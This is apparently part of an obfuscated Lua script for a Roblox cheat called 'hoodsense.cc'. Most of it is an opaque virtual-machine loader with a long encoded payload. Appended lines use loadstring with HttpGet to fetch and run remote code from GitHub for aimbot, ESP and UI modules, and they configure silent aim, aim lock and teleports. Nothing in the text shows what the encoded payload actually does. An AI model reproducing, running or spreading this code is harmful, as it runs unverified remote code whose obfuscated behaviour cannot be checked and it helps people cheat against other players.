then(uV)[4]=I(lV,18,14);fV=1;continue;else do(uV)[1]=D();end;do fV=2;end;end;else if fV==4 then uV[20]=I(lV,1,27);fV=0;else(uV)[20]=I(lV,14,4);fV=3;do continue;end;end;end;end;end;(cD[4])[kV]=uV;end;GD=2;continue;end;end;end;local kD=D();GD=1;while(Nh)do if not(GD<=0)then do if GD~=1 then cD[1]=I(kD,1,2)~=0;GD=0;else cD[6]=I(kD,1,1)~=0;GD=2;continue;end;end;else(cD)[8]=D();do break;end;end;end;local sD=R();GD=0;repeat if GD~=0 then cD[2]=D();break;else for Ki=1,sD do do(cD[7])[Ki-1]=Lh();end;end;GD=1;continue;end;until(Fh);GD=0;do while GD~=3 do do if not(GD<=0)then if GD~=1 then do(cD)[5]=D();end;do GD=3;end;else cD[15]=D();GD=2;continue;end;else(cD)[17]=R();GD=1;end;end;end;end;GD=1;local DD,yD,PD=Oh,Oh,Oh;repeat if not(GD<=1)then if GD~=2 then PD=D()~=0;GD=0;else yD=D();GD=3;end;else do if GD~=0 then DD=R()-133715;GD=2;continue;else for h1=1,DD do local C1=Oh;local c1=(D());local b1=0;while b1~=4 do if b1<=1 then do if b1~=0 then do if c1==180 then do C1=P(H(yD),5);end;elseif c1==13 then C1=R();elseif c1==xy then C1=P(H(yD),R());elseif c1==yy then do C1=q();end;elseif c1==178 then do C1=Fh;end;elseif c1==105 then C1=J();elseif c1==43 then do C1=P(H(yD),12);end;elseif c1==Vh then C1=Nh;elseif c1==18 then do C1=P(H(yD),R());end;elseif c1==245 then C1=P(H(yD),D());elseif c1~=206 then else C1=P(H(yD),D());end;end;b1=4;else if c1==180 then do C1=P(H(yD),5);end;elseif c1==13 then C1=R();elseif c1==xy then do C1=P(H(yD),R());end;elseif c1==131 then C1=q();elseif c1==178 then C1=Fh;elseif c1==105 then C1=J();elseif c1==43 then C1=P(H(yD),12);elseif c1==223 then C1=Nh;elseif c1==18 then C1=P(H(yD),R());elseif c1==245 then C1=P(H(yD),D());elseif c1~=206 then else C1=P(H(yD),D());end;do b1=4;end;do continue;end;end;end;else if b1==2 then if c1==180 then C1=P(H(yD),5);elseif c1==13 then C1=R();elseif c1==117 then C1=P(H(yD),R());elseif c1==yy then C1=q();elseif c1==178 then C1=Fh;elseif c1==Uh then C1=J();elseif c1==43 then C1=P(H(yD),12);elseif c1==223 then do C1=Nh;end;elseif c1==18 then C1=P(H(yD),R());elseif c1==245 then do C1=P(H(yD),D());end;elseif c1~=206 then else do C1=P(H(yD),D());end;end;b1=0;else if c1==180 then C1=P(H(yD),5);elseif c1==13 then do C1=R();end;elseif c1==117 then C1=P(H(yD),R());elseif c1==131 then C1=q();elseif c1==Ky then do C1=Fh;end;elseif c1==105 then C1=J();elseif c1==43 then do C1=P(H(yD),12);end;elseif c1==223 then do C1=Nh;end;elseif c1==18 then C1=P(H(yD),R());elseif c1==245 then C1=P(H(yD),D());elseif c1~=206 then else C1=P(H(yD),D());end;b1=2;end;end;end;(XD)[h1-1]=UD;local r1=({C1,{}});b1=0;while b1<=2 do if not(b1<=0)then if b1==1 then if PD then U[G]=r1;do G=G+1;end;end;b1=3;continue;else UD=UD+1;b1=1;end;else(OD)[UD]=r1;b1=2;end;end;end;GD=4;end;end;end;until GD>=4;local mD=(T[cD[5]]);for D6=0,2 do if not(D6<=0)then if D6~=1 then return cD;else(cD)[19]=D();continue;end;else for j9=1,hD do local a9=cD[4][j9];local X9,I9,y9=1,Oh,Oh;do while X9<3 do do if not(X9<=0)then if X9~=1 then if not((I9==5 or y9)and a9[5]>255)then else local VK=0;local xK,GK=Oh,Oh;while VK~=4 do do if not(VK<=1)then if VK~=2 then GK=OD[xK];do VK=1;end;continue;else do xK=XD[a9[5]-256];end;do VK=3;end;end;else do if VK~=0 then if not(GK)then else local kV,bV=1,Oh;repeat if kV<=0 then bV=GK[2];kV=2;continue;else if kV~=1 then(bV)[#bV+1]={a9,9};break;else a9[9]=GK[1];kV=0;end;end;until(Fh);end;do VK=4;end;else(a9)[2]=Nh;VK=2;continue;end;end;end;end;end;end;X9=3;do continue;end;else I9=mD[a9[1]];X9=0;end;else y9=I9==0;X9=2;continue;end;end;end;end;X9=0;while(Nh)do if X9==0 then if not((I9==14 or y9)and a9[10]>255)then else local cB,QB=Oh,Oh;local yB=0;repeat if yB<=1 then if yB==0 then(a9)[8]=Nh;yB=2;else if not(QB)then else local Zp,Hp=2,(Oh);while(Nh)do do if Zp<=0 then(Hp)[#Hp+1]={a9,7};break;else if Zp==1 then do Hp=QB[2];end;Zp=0;else(a9)[7]=QB[1];Zp=1;continue;end;end;end;end;end;yB=4;end;else do if yB~=2 then QB=OD[cB];do yB=1;end;else cB=XD[a9[10]-256];yB=3;continue;end;end;end;until yB>3;end;X9=1;else do if I9==2 then do a9[4]=j9+(a9[4]-131071)+1;end;end;end;break;end;end;do if I9==15 then local Rw,Fw=0,(Oh);local Vw=XD[a9[4]];while(Nh)do if Rw~=0 then if Fw then local nZ=Oh;local zZ=0;do repeat if not(zZ<=0)then if zZ~=1 then nZ=Fw[2];do zZ=1;end;do continue;end;else do(nZ)[#nZ+1]={a9,6};end;do zZ=3;end;continue;end;else a9[6]=Fw[1];zZ=2;end;until zZ>2;end;end;break;else Fw=OD[Vw];do Rw=1;end;continue;end;end;end;end;end;do continue;end;end;end;end;th=2;local sh=Oh;while(Nh)do if not(th<=1)then if th==2 then do sh=Lh();end;th=0;else do return lh(sh,Oh,n)(...);end;end;else if th~=0 then U=Oh;th=3;do continue;end;else o[1]=U;th=1;end;end;end;end)(string.match,error,"\105\110\115\101\114\116","\114\101\112",setmetatable,"\60\105\56",unpack,type,"\118","\99\104\97\114","\98\97\110\100",string,"\35",215,147,223,"\114\115\104\105\102\116","","\115\116\114\105\110\103",select,rawget,"\98\121\116\101","\103\115\117\98",131,"\60\100","\46\46","\96\102\111\114\96\32\115\116\101\112\32\118\97\108\117\101\32\109\117\115\116\32\98\101\32\97\32\110\117\109\98\101\114","\97\116\116\101\109\112\116\32\116\111\32\121\105\101\108\100\32\97\99\114\111\115\115\32\109\101\116\97\109\101\116\104\111\100\47\67\37\45\99\97\108\108\32\98\111\117\110\100\97\114\121",105,bit32.lshift,rawset,"\110",nil,130,tostring,"\96\102\111\114\96\32\105\110\105\116\105\97\108\32\118\97\108\117\101\32\109\117\115\116\32\98\101\32\97\32\110\117\109\98\101\114",256,"LPH%C544014D2H00B0F0BF0500B0BB2000F000BB002H0B2H000B3H000BB000B002B000B0500BB000BB0BBB2H00F000BB000B00B02H0B2HB000B00BB0050B00502HB0BBB03H0B002BB00BF0BB5H008F5A61410F029C0A02000744C447C4874B0B48CB872H9291128719D91819824HE017E7A72HE7072EEE165D77B5F58FC177FCE9BBB92BC394BEEE0ECA3170880A512861693958037D1F135F16AC5495265223C42H6D7B18211BB4F42HB482BBFB3BBB544H02824H89084H50173H57D7874H9E17653H25082C2H47E9394HF3313H3ABA872HC1DBC158882HB3DE4A4H000200023H00F8CDAE3A35AD51190200098F0F9E0D87D898C95A872HE1F06387AA2AB7AA8233B33233177CBC697C0785C5BDF7774E0EF43B7797845F1901E0EC823A9469415E6975F214C49F513B2BDA337AC484CA46870DEBF1CD1796F1A29607DFB99F1F35A84E5468173H71F187FA9C3B3A17C3A4F7C3070C4C168C87D5B39515351EF8E2DE173H67E7877016B1B017B9DE8DB90742240282353H0B8B8794F24E54589D7B615D173H26A6876F09AEAF17F89FCCF8070181FF81870A6C4ACA3593756F53173H9C1C876503A4A5176E497B6E07F7D02HF755C0F850BE0389EFC94935D2342E12173H9B1B872442E5E417EDCAF8ED07B6912HB6553F9ED2BC40482E0888353H9111879A3C5B5A5823C5DFE3173H2CAC87F593343517FED9EBFE0787A02H8755903DC8D30A197F59D93562849EA2173H2BAB87B4D27574177D1A487D0746612H4655CFB323904CD8BE9818353H21A1872A8CAEEA58B3554F73173HBC3C870563C4C5178EE9BB8E0717302H1755200E8F2D96A9CFE969353H32B2877B9D83BB58C4223804173H0D8D871670D7D6175F386A5F072HA8132887711731B1352H7A7BFB87C3A58303353H4CCC8795B35F5558DE38221E17A700C4A707305670F035F9398C7987026442C2352H4B81CB8794B38194079DBA2H9D55E62FEC3F702F496FEF353H38B88781A76F4158CA2C360A1793D39D1287DCBB2HDC07E5C22HE5552E50E46580F791B7373580C0C6008789EEBD890752752H52551B8949317BE482A42435ED0B112D173HF67687BFD97E7F17C8AFFCC807D1F62HD1555AD1486114E385A323356CECDFEC87B5534975173H3EBE870761C6C717107725100719995C9987E285D7E2072H6B6CEA87741234B4357D9B81BD1786C6E20687CFA98F0F35987E6458172H611EE1872A0D3F2A07B3942HB355FC7DC0E175C5A38505350EE8F2CE175770425707A020452087A9CE2HA90772552H72553B3AFBEF6084E2C444353H4DCD87D6702516585FB9A39F17E8A8F16887F1D6E4F107BA9D2HBA55832ACBCE014C2A0C8C3555B3A995175E794B5E07274167E73530F07BB087395E583907C2A48202353H8B0B8714729FD4581DFBE1DD173HA62687EF892E2F1778DF44780781A62H81554A2DD5F80F137553D3353H1C9C87E5431E25582EC8D2EE173H77F7870066C1C017C96EC7C90792B52H92559BF3F8FD2DA4C2E46435AD4B516D1736F6EFB6877F193FBF35C82E3408173H1191871A7CDBDA176304566307AC8B2HAC55752E8EAC0ABED8FE7E353H072H8790F6415058997F6559173H22A2876B0DAAAB17F493C1F4073D5B7DFD35C6862BB9878F69734F173H9818876107A0A1176A4D7F6A07F373807387FC1A003C173H45C587CEA80F0E1797B0939707E0203A608729CFD5E9173HB23287FB9D3A3B1784E3B184078D0D5CF28796706A56173HDF5F87E88E29281731163531072HFA4B7A8783E4888307CCEB2HCC5515883BBC7B5E381E9E35E7011B27173H70F087B9DF7879174225764207CBEC2HCB55D4231C863FDDBB9D1D353HE66687AF89076F58789E84B8172HC19C41874A2C0A8A353H1393879CBA205C58A5435965173H2EAE877711B6B7170027040007C9AF890935D2522AAD879BFDDB5B35648298A4173HAD2D87B6D0777617FFD8FBFF07486F2H485591E18A5B6CDABC9A1A353HA323872C4A9AEC5835D3C9F5172HBEB43E8747202H47072H9048EF8759BFA599172H620DE2872B4D6BEB353H34B487FD1B1C3D58C6203A06178FE8BA8F07D8FF2HD85521CBC6CB656A0C2AAA35F3150F33177C1B497C0785A22H85550E15270E53177157D7352H2081A087294E1D2907325472F2353H7BFB870422A4C4580DEB87CD172H96271687DF39231F17680F7D68072H7132F1873A5D313A07C3031ABC87CC2A300C171572211507DEF92HDE556742009400701630B035799F85B91782E5B68207CBAD8B0B353H54D4879D3B615D58E6001A26172HAF122F87F8DFFCF80701419A81870A6C4ACA3593756F53173H9C1C876503A4A5176E095B6E07F7D02HF75500E049545189EFC94935D2342E12173H9B1B872442E5E417EDCAF8ED07761036B6353H3FBF87482E93885851B7AD91175A7D4F5A07234563E3353H2CAC87F5D35D35583ED8C2FE1787A0928707D0F72HD05559F0105233620422A2353H2BAB87B4D2037458BD5B417D1746C65DC6870F694FCF35D83E24181721E1DE5E87EA8DE1EA0773542H73557C472FDB0C056345C5354EA8B28E4H179787A0C6616017690E626907F294B23235BB7B5A3B8704632H04070D2A2H0D559621ACFE539FF9DF5F35688E94A8173HB13187BADC7B7A1703642H03078CEACC4C3595736955173H1E9E876701A6A717F0972HF007395F79F93502E4FEC2172H4B80348754321494353H9D1D87A6803D66582FC9A5EF173H38B88781E74041170AED0F0A0793B42H93559C9E510B3E254365E535AEEE07D187F791B7373540A6BC80173H89098792F4535217DBFCFADB0724032H2455EDC896C152365076F635BF59437F17C8AF2HC807D1910851875A3C1A9A353H23A387AC4A316C58B5534975173H3EBE870761C6C7171077241007193E2H1955628E169E70ABCDEB6B353HB434877D5B94BD5846A0CC86173H0F8F8798FE59581761866461072AEA4BAA8773958FB3173HFC7C87C5A3040517CEA92HCE0757702H5755E00603F90C690F29A9353H72F2873B1D80FB5884627844173H4DCD87D6B01716179FF82H9F072HE8F76887315771F1353HBA3A8783252B43584CAAB08C179515C515879E78625E172HE7DD6787F0160C3017395E63390702252H0255CB74086431147254D4353HDD5D8766809CA658EF09132F17789F62780781A62H81550A4EED6674137553D335DC3A201C173H25A5872E48EFEE177750547707C00098408709EFF5C9173H921287DBBD1A1B1764032H64076DAD24ED873611233607BF982HBF55483083C457D1B7911135DA5A125A87A3455F63173HAC2C877513B4B5177E194B7E07C7A187073590766C50173H59D987E284232217ABCC9EAB07345274F4353HFD7D87062097C6588F69734F1798FFAC9807A1614ADE87AACCEA6A353HF37387FC5A403C5885637945172H0EAB718757B1AB9717E020A1608729CFD5E9173HB23287FB9D3A3B1784E3B184074D2B0D8D3596706A5617DFF8DBDF0728E87CA8873156053107FADD2HFA5583FA0A27390C6A4CCC35D5157B55875E381E9E353H27A787B0D6037058B95F4579173H42C2870B6DCACB171473201407DDBB9D1D35E6262D9987AF49536F17B8DF8CB807C1E62HC1554A57A55D0FD3B59313353H5CDC87A503586558EE08122E17B7D083B70700272H00554999322439127452D2359B7D675B173HA424876D0BACAD1776117D7607FFD82HFF55C867479B7B91F7D15135DA3C261A17A3C4A8A307ECCB2HEC5535DF17C4317E183EBE353H47C7875076B4905859BFA599176205696207EB6B3B9487F492B434353H3DBD87C6E07E06584FA9B38F17D8986CA787214761E135AAEA3C2A8733D43633077C5B2H7C55450E2BC9828EE8CE4E353HD75787E046442058E90F1529173HF27287BBDD7A7B17C4A3F0C407CD4D794D875630169635DF39231F1768E817E88771164471073AFA834587036543C335CC2A300C173H1595871E78DFDE1767002H6707B030F93087B95E90B90782A52H82554BBEEA7C3194F2D454359D7B615D172666CA59876F092FAF3538DEC4F81701C14681870AECF6CA173H53D3875C3A9D9C17A5C22HA5076E492H6E5537742D285080E6C040353H49C987D2746C12585BBDA79B17E464C364872DCBD1ED173HB63687FF993E3F1788EFBC8807915179EE879A7C665A172HE37A9C87EC0A102C1735122035073E587EFE3547A1BB87173HD05087197FD8D917A2C597A207EB8DAB2B353H74F487BD5B577D5886607A46173HCF4F87D8BE1918172146142107EACD2HEA55733E3FA3407C1A3CBC3505E3F9C5173H8E0E87D7B1162H176007546007A9CFE96935F2140E32173HBB3B87C4A20504170D6A390D07D6F12HD6559FA0F4DB88680E28A8357197FBB1177A9D7F7A0703242H03554CD44CAB3195F3D555351E5EEB6187A7C093A707F0D72HF055392DBD1B2D026442C2353H4BCB8754F28A94585DBBD79D176681636607EFC82HEF5538EC470E8B81E7C141350ACA028A8753B5AF9317DC1CB55C87E5C2F0E507AE892HAE553743ACC55840260080352H891CF68792746E5217DB9BBD5B87E4021824172D4A262D07365076F6353H7FFF87082EB5C85811F7EDD1173H9A1A87E3852223176C0B676C0775522H75557E897D0511076147C7353H109087D9FF68195822C4DEE2173H6BEB877412B5B417BDDAB6BD072H8659F9870F683A0F072H588827876106556107EA8CAA2A353HB333873C5AF3FC58C5234F05172HCEFC4E8797716B5717A0C794A007A98E2HA955320114AF803B5D7BFB353H44C4878DAB104D58D6302A16173H9F1F87284EE9E817F196C5F107BA7A3CC58783E5C343353H8C0C8755738495589E78625E173HE76787F096313017391E2C3907C2A48202354BADB78B173HD454871D7BDCDD17A681B3A6072F082H2F55B83C49AC1941270181353H4ACA871335CBD358DC3A201C173H25A5872E48EFEE177710427707006640C0353HC9498752B4FF9258DB3D271B173H64E487ADCB6C6D1736510336077F193FBF353H088887D1F75D11581AFCE6DA173H63E3876C0AADAC17B5D281B507BED8FE7E350747B0788750372H5007597E2H5955E20F616C406B0D2BAB353HF474873D1B86FD5806E0FAC6173H4FCF87583E999817A1C62HA1076A4D2H6A55F310890C1DFC9ABC3C353H45C587CEE84E0E5857B1AB97173HE06087294FE8E917B2D52HB2072H3BF6448784E32H84078DAA2H8D5596535925771F795FDF3528E89D57873156043107FADD2HFA55435F5B032B0C6A4CCC352HD562AA875E381E9E35E7011B2717703058F087791E2H790742828F3D870B6D4BCB3514946D6B871DFA181D07264066E635AF49536F17B878D9C787C1A6F4C1074A2C0A8A353H1393879CBA4F5C58A5435965173H2EAE877711B6B7170067350007C9AF89093512F4EED2173H5BDB876402A5A417ADCA98AD07B6D0F676353HFF7F8788EE73485891776D51171A5AC66587A384BEA3072C4A6CEC35F5B55D8A877E183EBE35478789388750361090353H991987A2044262582BCDD7EB173H34B487FD9B3C3D1706613306074F290F8F353HD858872187B4E1586A8C96AA173H33B387BCDA7D7C1785E2B085078EE8CE4E353HD75787E086132058E90F152917F272A98D87BBDDFB7B35C444D844870D6B4DCD3556B0AA96173H1F9F87A8CE69681771564C71073A1D2H3A55432E206214CCAA8C0C35D5332915173HDE5E87A7C1666717B0572HB007B9F9E7398742A4BE82173H0B8B8794F25554175D7A075D0726012H26556F5786FB82385E78F8353H0181870AACD2CA5893756F53179C5C20E387650325A5353H6EEE8737D180F75880667C401749C978C987D2342E12172H9BC2E487E4832HE407EDCA2HED55368380B804FF99BF3F3548AEB4881791F62H91075A7D2H5A55E36793123FEC8AAC2C4H35B5873E988AFE5847A1BB87173HD05087197FD8D917A2C52HA207EB8DAB2B35B4524874177D3D77FD8786E0C64635CF8FF74F87D8BE9818352H2130A187EA8DAAEA0773F3300C877C9A80BC173HC545874E288F8E2H17F03E170760472H605569E71EE608F294B232353HBB3B87C4A25E0458CD2B310D17D6F18CD6075FDFDA2087A84FADA807B1962HB155FA885AED13C3A58303353H4CCC879573125558DE38541E173HA727873056F1F017F99EDFF907C2E52HC2554BCBE7D88E54321494355DBBD79D173H66E6872F49EEEF17385F24380741662H41558A0BD2826D53351393351C3A88DC17E565B56587AE89AAAE0737B7EB488780E72H8007492F0989353H52D2871B7DAADB58E4021824173H2DAD873650F7F6177F184A7F07C8EF2HC85591D83E31655A3C1A9A353H23A387ACCA5F6C58B5534975173E590B3E07C7E02HC755902E0CF551D9BF991935E2A2B19D876B0C2H6B07B4932HB455BDEED3566846200686350F8F9E7087987E6458173H61E187EA8C2B2A17B3D487B307FC3CCE8387C5233905172HCE27B18797716B57173HA02087690FA8A91772152H72073B5D7BFB3584627844174D0D05CD87D6302A16179F5F8C1F87284E68E8353HF171877A5CB9BA5883657F43173H8C0C8755339495175E795A5E072HE7DA6787F096B030353H39B987C2244002584BADB78B173HD454871D7BDCDD17A6C193A607EF89AF2F353H78F88741A7B081588A6C764A173HD35387DCBA1D1C1725421125072E486EEE353H77F7870026A6C05809EF83C9173H921287DBBD1A1B176483616407ADCBED6D353H36B6877F2HD9BF58C82E3408171176251107DAFD2HDA5523AA97C43F6C0A2CAC353HB53587BE58617E58C7213B07173H50D08799FF5859172245162207AB8C2HAB55F4C9FB1A643D5B7DFD353HC646878FE9194F2H58BEA498173HA12187AACC6B6A17F394C6F3073C1B2H3C558518253945CEA88E0E353H9717872086C1E05829CFD5E9173HB23287FB9D3A3B1784E3B184074D2B0D8D35569669D6871FF995DF173H28A887F197303117FA1DFFFA078343860387CC2BC9CC07D5F22HD5555E31A3321BE781A7273570308D0F87B9DFF9793582647E4217CBECDECB0714332H1455DD79165A36264066E6356F2FBD1087B8DFB3B807C1E62HC1554A444DEA7AD3B59313353H5CDC87A503626558EE08122E173HB73787C0A6010017096E020907127452D2355B9BC42487640224A4353HAD2D87B6503276583FD9B5FF17488868C8875176555107DABC9A1A353HA323872CCAC9EC5835D3C9F5173HBE3E2H87E146471790B7949007593F1999353H62E2872B8D8AEB58F4120834173H3DBD87C6A00706178FA88B8F07D8FF2HD855E1BE4123586A0C2AAA35F3150F33177C5B787C078545B3FA874E297B4E07D7F02HD7552015588A86E98FA9293532D4CEF2177B5C7F7B07C484F3BB87CDEAECCD0756301696351F5FDD6087680F2H680771562H7155BAF486953F036543C3350C4C9F73871572201507DE9ED75E876740276707B0972HB05579C27E8F874224028235CB2D370B175414E12B879DFBDD5D35E6006C26172HAF00D087385E78F83501C1907E870AECF6CA1753744653079CBB2H9C55E560919570AEC8EE6E3537D1CBF7173H40C08789EF48491712350712079BBC2H9B55A4278F53402D4B6DED353HB63687FF59613F5848AEB488173H9111879AFC5B5A17E3C4F6E3072H2C9C5387F593B52H353HFE7E8747E19B875810F6ECD0173HD959876204A3A2172B0C2F2B07743462F487BDDBFD7D3586607A4617CFE8DACF07D8BE981835E1071D2117EACDFFEA0773542H73557CF991B113056345C5354EA8B28E4H179787A0C6616017694E7C690732152H32553B79967F24C4A28404353H0D8D871670AFD6589F79635F173HA828877117B0B1177A5D6F7A0703242H03554CD23C6A9795F3D55535DE38221E17A7E7ADD88730D6CCF0173HF979870264C3C2174B2C7F4B07941432EB875DBBA19D172H666719872FC9D3EF173H38B88781E74041170A6D3E0A0793B42H9355DC8CF99904254365E5353HAE2E87F7D17E375840A6CA80172H89EFF68792746E5217DBBCEFDB07E482A424353H2DAD8736D0F9F658BF59357F173HC848871177D0D1179A7D9F9A07E385A323356CEC4B138775927075073E192H3E55879FCB9A08D0B6901035D93F5319173HE26287ABCD6A6B17B453B1B407BD9A2HBD5586FD39303ECFA98F0F35987E1258173H61E187EA8C2B2A17B354B6B307FC7CC98387C5233905173HCE4E8797F1565717A0C795A007A98E2HA955B27D144F6D3B5D7BFB354404B03B878DEBCD4D353H1696875FF9CB9F5828CED4E817F131458E877A9C86BA172H435E3C874C2A0C8C3555B3A995175EDE56DE87274167E73530F0CA4F87F99FB939353H0282874BAD8F8B5814F2E8D417DD9DF6A287A681B3A6072F082H2F5578B0ABE92241270181353H4ACA8713B587D358DC3A201C173H25A5872E48EFEE177750627707C0000BBF87C9EE8EC90792B52H92551B768AF15CA4C2E464353H6DED87F690123658BF3FF4C087086F2H080711362H1155DAEDB07513A3C5E363356C8A90AC173HB53587BED87F7E1707603H0790F6D0503559990026872285312207AB8C2HAB55B4AB7EFE933D5B7DFD353HC646878F29264F2H58BEA498173HA12187AACC6B6A17F314E7F3073C1B2H3C5585E41AC177CEA88E0E3557B1AB97173HE06087294FE8E917B2D586B2073B1C2H3B55840E821B774D2B0D8D3556D6B029871FF9E3DF173H28A887F197303117FADDEFFA0783C350FD870CEAF0CC17D515DBAA875EB8A29E172H27A55887B0D6F070353H79F98782245442580BEDF7CB173H149487DDBB1C1D17E6812HE607AFC9EF6F35B878BDC787016741C1353H8A0A87D3752E13589C7A605C173H65E587EE882F2E17B7D083B70700272H00554901B3A639127452D2353H5BDB8764C2A8A4586D8B91AD173H76F6873F59FEFF17482F7D480751915A2E87DA2D221140633EA7A307AC316CEC633HF57587FEE3B3BE58071AC0EF6E508DD5900759842H9955E2166FBD01EBB5E0EB8234F4F6B587FDA323C96E2H06172H878F53998F07D818D55A8721B0EDE1076ABB2HAA55738856F9163CADFC7C633H8505870EDF364E589786517F6EE0F128200729BB262982B2E32HF31A3H7BFB8784D5A2C4584D9CDC396E96C4AC96071F0D2H1F5528714B140BF1A0F171633AFA42BA87C3D3D2C3078C2H8A687B95051415822HDEDFDE39E7282H661AB0F09F3287B9DE95B9078202CA03870B132H0A1A54D4CDD5879D3A735D07266647A787EFF1B8AF07B8E62HF855C1C8909D184A14DACA82539376D187DC79A29C0765412HA5316EAE1BEE8777D2FFF707C0652H4055C99083496D12F72H12313H9B1B87E4C195E4582DC9EDEC0576D236B654FF5B6F3F173H88088751359091175A7F2H5A17E3633763876C49AC2C70B5D00C35173HFE7E8707228687171075D6D007592H7C920A3HA22287AB8E2A2B17F41174758F7D3DDBFC8746C0704607CF8FE44F87984A0AEC6E2132672107EAF92HEA55B3232H00513C6E3CBC633HC545870E5CBA8E5897C591BF6E60F3636007297A63698232720BB287BBB483BB0784CA8404633H0D8D87569881D658DFD1DADD6EA8A793A807B1BE2HB155BA08A0A370438C4603074C0CCFCC8795BC4A55072H1EAA9E87E74327A763B05478726E399DBEF90702E62HC2558BDB9E0E259431D194079D5D941C87E67CE1CE6EEFAF186E87B89CB838352H41A8C1870A06010A822H939093399CD6DEDD1A65AFEF116E2HAE102E8737671D3707C0108580820986088948D21D57AC6EDB5B32A48724430D24076DCA692D07B6D12HF655FF922EE38E08EE6F864ED15138AE871AF9F89A07A3002H2355ECFCF23851B59656757E3E5A273E82C7472HC73910732H111A592H3AB56EE2625762876BB55D6B07346934B4633HBD3D87061BAE86588F5288A76E58C61C5807617F2H6155AA475EB817F3ED2HB382FC3CCE7C87C5162H041ACE1A4B666E2H57E9D687602CA7A007A9299A2887B2672H731A3HFB7B8784914544584D9BC8E56E16565D96875FB7AB9F0728C02HE85571B5299D75FA2H12EB4EC3AB5843072H8C960C87D515CF95173H5EDE87A767E6E7172H70B0C83F39F95AB88782E302036A3H8B0B875475CAD4581D7CFC5F6EA626022787AF3C2H2E1A3H78F8870192F881588A99CFE26E9387EDD3079C48161C8225A5D25A87EEF32HEF1A3H77F787C0DDA9C058892HD43D6E925243ED871B9A4981336424D0E5876D6E3FF73336B57D9033FFBC2HBF173H08888751921011179A99D9503F3H63E387EC2FADAC17F5F6B6446EBEFD3F7E07C7042H075590A9D05A86595D595A4322262H22556B3D211352F4308468332HFDF87C87062546C6638FEC47FD6E2H98B61887E1822HA01AEA09C9DC6EF3D773113FBCDFBC3C63C5E6CDBE6E0ECE928E87974C8D636EE020376087E935F21D6E32EEB5B2073BE7BB3B633H8404878DD1FC8D58564AD1FE6EDF5FFF5F87E8CF0F780AB12H967E102HFAC27A8703432H83313HCC4C875595E4D558DE2H9E9F053H27A78730B05070582H3979788F3H42C2872H8BEBCB589454948A6E1D5D3A9D87664266E6353H6FEF87389CE1B85841E58BC1173H8A0A8793B71213179CF8615C0765402H65176E4B7D2E07B7F704378740CB80006349C28DA16E2HD23B53879B382H5B1EE44724A463ADED7D2D87F6B376776A3HFF7F87C84D66485891D4D2946E2H1AFF9A87A36A23A363EC6C566C87F51575F563BE5EB94D6EC7E7004707907090916A3H99198762824D6258AB2HCB696EF4947334073D7D87BC87C62E6706078FA62H8F172HD8F95887A12FF8E182AAEA372A8773FE203307BCB0FC7C633H8505878E02754E58172H5B616E60AD6B20173H29A987B27FF3F2173B36F6973F3HC444878D40CCCD17165B8F96072H1F1A9E87E8A84C6807B1317F7107FA3H3A55C3700CEA450C0D590C0715953995871E09C2DE07A7702H6755308CAB7819B921ACB982C2952H831A3H0B8B871443005458DD4ADBF56E263E462607AFB72HAF55780BE5033841D90C0182CA4A564B87530C4253829C5CE51D87E5AF20276EAEE42E6E07F7B7F67687C0A868124E89A15249072H126992875B8A8E9B82E4F52HE51A3HED6D87B62793B6587F2H2ECB6E88483BF78711832H901A5A9AB9DB87E38980E3072C062H2C55F5615462117E17D7AA4E476E9C870710F92HD055D95BAC3F6DA288B5A2173H2BAB8774DE7574173D971C7D07C66C144617CF4FD14E879804171882E13A2H201AEAAA0B9587B3B6F6177B3CB33CBC864573068E364E819F8E82D7592H161A60AF6ECC6EE926436907B23D2H32553B8B0C950EC4CB0504820DCD688D87163EFE84101F2HF70E4EA828DE298731AC2HB01A7AFA4DFB87839F4F0307CC502H4C55D50C8F1836DE420D1E82A7BB2HA61A3HF07087F965CEF958822HDE366E8B97614B07D448149463DD811A356EA67A2E6607EF32FAEF8278242H391A3H41C1874A963B0A5813CF143B6EDC5C2F5D87A579FDE5072HAE58D187F77B2H361A800D857E6E89497D088792CD7552071BC42HDB55248F5E4D6D2D4D3B2D822HF6627787BF2C6F7F0708DB2HC855D1A5FE293F9A8E9F9A8263302H221A3H6CEC8735E6737558BEEDBB966EC707C64587103627100819D91F9B87A286D3E2076BAB97EA87B4B52HB439FDBC2HBD1786461007878FC08F0F633H58D887E16E446158AA6525866EB3330BCC87FC71A2FC0705C5558587CEE767543F572H7E9D3FE0C9FBA007A98000FB0A72F2820D87FBAAC2FB0744552H4455CD3D77240496C69616639FDF401E87A83FFFE8072HF1CB71877A2FB2BA8243562H421A8CCC3B0D87551C9C616E1E14585E07A7ED2HE755B079A53917F9F0B939633H0282874B42E68B58141DD02A6E9D57F9DD07A626862787EF08877F4E785078794381A92H81554A1860BF11933B88D3075C342H1C55E5D052FF826EC6E4EE0777B7E9F687809FDFA758C909004887D21FF39207DBD8987F7BA4697764822H6D831287B6692F3607BF603FBF633H088887110E601158DA05DD296E63E3F3E287ACCB8BE34EF512E9B5073E592H7E558764244083D0B7085007D97E2H5955A25889477BABCC8CE44EF4B4D575877D2BBEFD0746D02HC6558FDEB0585B580E8898822HA18E21872A007C6A07B3D92HF355FC9D35F138856CEF114E2H0E238F87D772E70B33E0A02C6187A9E92HE81A3HB232877BFB113B5884C47584968D0D3CF287D60E6556071FC7DCDF822868BA5787317B2A3182BAF37BFA48C34A877D6ECC4CA74C
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/AlexR32/Roblox/main/BracketV3.lua"))()
+local Window = Library:CreateWindow(Config, game:GetService("CoreGui"))
+
+local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/fov.lua"))()
+local ESP = loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/esp.lua"))()
+ESP:Toggle(false)
+ESP.Tracers = false
+ESP.Names = false
+ESP.Boxes = false
+Aiming.TeamCheck(false)
+Aiming.VisibleCheck = false
+ 
+local Workspace = game:GetService("Workspace")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+ 
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+local CurrentCamera = Workspace.CurrentCamera
+
+local SilentSettings = {
+    SilentAim = false,
+    AimLock = false,
+    Prediction = 0.178
+}
+
+game.StarterGui:SetCore("SendNotification", {
+    Title = "hoodsense.cc";
+    Text = "Hello, Loading...";
+    Icon = "http://www.roblox.com/asset/?id=8768441000";
+    Duration = "10";
+    callbakc = bindableFunction;
+    Button1 = "Okay!";
+})
+wait(3)
+local Tab1 = Window:CreateTab("Main")
+local Tab2 = Window:CreateTab("Teleports")
